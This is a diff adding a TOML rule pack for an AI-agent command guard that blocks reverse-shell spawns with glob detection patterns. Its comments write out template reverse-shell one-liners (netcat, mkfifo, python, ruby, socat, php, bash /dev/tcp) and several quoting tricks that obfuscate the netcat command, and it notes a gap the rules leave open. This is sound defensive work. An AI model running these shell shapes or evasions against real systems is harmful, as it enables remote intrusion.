@@ -1,0 +1,217 @@
+# apohara-agentguard COMMUNITY pack — reverse shell / remote shell spawn
+#
+# Opt-in: enable with [community_packs] enabled = ["reverse-shell"] and
+# community_packs.dir pointing at this directory (or the
+# AGENTGUARD_COMMUNITY_PACKS_DIR environment variable).
+# Patterns are substring or `*`-glob per leg (NOT regex); severity >= 8 blocks
+# under the default thresholds.
+#
+# Grounding: authored against the QuasarNix benchmark's real malicious corpus
+# (235,060 commands). Families observed there, each covered by >= 1 rule:
+#   1. `nc -c <shell> <ip> <port>`            (OpenBSD netcat exec-on-connect)
+#   2. `V=$(mktemp -u);mkfifo $V && telnet <ip> <port> 0<$V | <shell> 1>$V`
+#   3. `rm f;mkfifo f;cat f|<shell> -i 2>&1|nc [-u] <ip> <port> >f`
+#   4. `python3 -c '…socket…connect…dup2…pty.spawn(<shell>)'`
+#   5. `python3 -c '…socket…connect…dup2…subprocess.call([<shell>])'`
+#   6. `ruby -rsocket -e'exit if fork;c=TCPSocket.new(…);…IO.popen…'`
+#   7. `socat tcp:<ip>:<port> EXEC:'<shell>',pty,stderr,…`
+#   8. `php -r '$s=fsockopen("<ip>",<port>);system("<shell> <&3 >&3 2>&3");'`
+# Plus the classic shapes demanded for completeness even though absent from
+# that corpus: `nc -e`, `ncat -e`, `socat … SYSTEM:`, `bash -i >& /dev/tcp/…`.
+#
+# STRICT 0-FP discipline (see tests/corpus/benign_reverse-shell.txt): plain
+# `nc` clients/listeners without an exec flag, `nc -l … -c '<echo>'` HTTP
+# listeners, bare `/dev/tcp` port probes (`exec 3<>/dev/tcp/h/p`,
+# `cat < /dev/tcp/h/p`), legit `python -c "import socket"` scripts,
+# `pty.spawn` tty-fix idioms without a connected socket, ruby/socket clients
+# without a command loop, socat forwarders without EXEC:/SYSTEM:, ssh -i,
+# telnet fun, kubectl port-forward and curl-to-localhost all stay Allowed.
+# Consequence: a bare `/dev/tcp` redirection WITHOUT an interactive shell
+# (`exec 5<>/dev/tcp/h/p` + read loop) is intentionally NOT blocked — the fd
+# idiom is indistinguishable from a pure-bash port probe per leg. Documented
+# residual gap.
+
+schema_version = 1
+
+[pack]
+name = "reverse-shell"
+version = "1.0.0"
+description = "Reverse-shell / remote-shell spawn: netcat -e/-c exec, ncat -e, socat EXEC/SYSTEM, mkfifo fifo chains, telnet stdin-fed shells, python/ruby/php socket-to-shell one-liners, interactive-shell redirects (incl. bash -i >& /dev/tcp)."
+
+[[rules]]
+id = "rs-nc-c-shell"
+pattern = "nc -c *sh*"
+severity = 9
+category = "reverse-shell"
+
+# Intra-word single-quote split of the netcat head (`n'c' -c <shell> …`): bash
+# quote-removal makes this identical to `nc -c …`, but the leg text keeps the
+# quotes. The literal token n'c' is never benign.
+[[rules]]
+id = "rs-nc-c-shell-quoted"
+pattern = "n'c' -c *sh*"
+severity = 9
+category = "reverse-shell"
+
+# Same-family evasion siblings observed under single-token obfuscation of the
+# netcat head — every one evaluates to `nc …` in bash yet survives verbatim in
+# the leg text: backslash escape (`n\c`), brace expansion (`{nc,}`), pathname
+# charclass (`n[c]`), empty-positional expansion (`n$@c`), double-quote split
+# (`n"c"`), and ${IFS} word-joining (`nc${IFS}-c…`). Each literal token is
+# never benign; each rule still requires the exec flag + shell tail.
+[[rules]]
+id = "rs-nc-c-shell-bslash"
+pattern = 'n\c -c *sh*'
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-nc-c-shell-brace"
+pattern = "{nc,} -c *sh*"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-nc-c-shell-charclass"
+pattern = "n[c] -c *sh*"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-nc-c-shell-dollarat"
+pattern = "n$@c -c *sh*"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-nc-c-shell-dquote"
+pattern = "n\"c\" -c *sh*"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-nc-c-shell-ifs"
+pattern = "nc${IFS}-c*sh*"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-nc-e-shell"
+pattern = "nc -e *sh*"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-ncat-e-shell"
+pattern = "ncat -e *sh*"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-socat-exec"
+pattern = "socat*EXEC:"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-socat-system"
+pattern = "socat*SYSTEM:"
+severity = 9
+category = "reverse-shell"
+
+# stdin-fed telnet (`telnet host port 0<$fifo`): a telnet client whose stdin
+# comes from a redirected file is a fifo-chain transport, not interactive use.
+[[rules]]
+id = "rs-telnet-stdin"
+pattern = "telnet*0<"
+severity = 8
+category = "reverse-shell"
+
+# Classic fifo chain's shell leg (`…|sh -i 2>&1|nc …`). The compound splitter
+# treats the bare `&` of `2>&1` as a separator, so the leg scans as
+# `<shell> -i 2>` — and the literal sequence "sh -i 2>" sits inside
+# "/bin/sh -i 2>", "bash -i 2>", "dash -i 2>", "zsh -i 2>" (every *sh), while
+# `ssh -i KEY …` cannot produce it contiguously (-i always takes an argument).
+[[rules]]
+id = "rs-shell-i-fd-pipe"
+pattern = "sh -i 2>"
+severity = 9
+category = "reverse-shell"
+
+# ${IFS}-joined twin of the above (`…|bash${IFS}-i${IFS}2>&1|nc${IFS}…`): the
+# leg keeps the literal ${IFS} tokens, so the matchable shape is
+# "sh${IFS}-i${IFS}2>" (a substring of the bash/dash/sh forms alike).
+[[rules]]
+id = "rs-shell-i-fd-pipe-ifs"
+pattern = "sh${IFS}-i${IFS}2>"
+severity = 9
+category = "reverse-shell"
+
+# Interactive shell with an outbound redirect (`bash -i >& /dev/tcp/h/p`,
+# `/bin/dash -i >& /dev/udp/h/p`, `bash -i >log 2>&1`). Post-split the leg ends
+# at the `&`, so the matchable shape is `<shell> -i >`. "ash -i" is a substring
+# of both "bash -i" and "dash -i"; "ssh -i" never matches ("-i" is followed by
+# its key argument, never directly by ">").
+[[rules]]
+id = "rs-shell-i-redirect"
+pattern = "ash -i*>"
+severity = 8
+category = "reverse-shell"
+
+# ${IFS}-joined twin of the above (`bash${IFS}-i${IFS}>&${IFS}/dev/tcp/h/p`):
+# post-split the leg ends at the `&`, leaving "…ash${IFS}-i${IFS}>".
+[[rules]]
+id = "rs-shell-i-redirect-ifs"
+pattern = "ash${IFS}-i*>"
+severity = 8
+category = "reverse-shell"
+
+# PHP socket-to-shell: fsockopen followed by a command executor fed from the
+# socket fds. A benign `php -r` HTTP probe does fwrite/read, never system/popen.
+[[rules]]
+id = "rs-php-fsockopen-system"
+pattern = "fsockopen*system("
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-php-fsockopen-popen"
+pattern = "fsockopen*popen("
+severity = 9
+category = "reverse-shell"
+
+# Python socket→shell one-liners: connect + fd duplication + pty/subprocess
+# spawn. Legit socket scripts stop at connect/recv; the docker-tty fix
+# (`import pty; pty.spawn("/bin/bash")`) has no connect/dup2 before it.
+[[rules]]
+id = "rs-py-dup2-pty"
+pattern = "dup2*pty.spawn"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-py-connect-pty"
+pattern = "connect*pty.spawn"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-py-connect-dup2-subprocess"
+pattern = "connect*dup2*subprocess"
+severity = 9
+category = "reverse-shell"
+
+# Ruby socket backdoors: -rsocket require + TCPSocket.new driving either a
+# daemonizing fork or an IO.popen command loop. A connectivity-check client
+# (TCPSocket.new + write/read only) matches neither.
+[[rules]]
+id = "rs-ruby-popen-loop"
+pattern = "-rsocket*TCPSocket.new*popen"
+severity = 9
+category = "reverse-shell"
+
+[[rules]]
+id = "rs-ruby-fork-connect"
+pattern = "exit if fork*TCPSocket.new"
+severity = 9
+category = "reverse-shell"
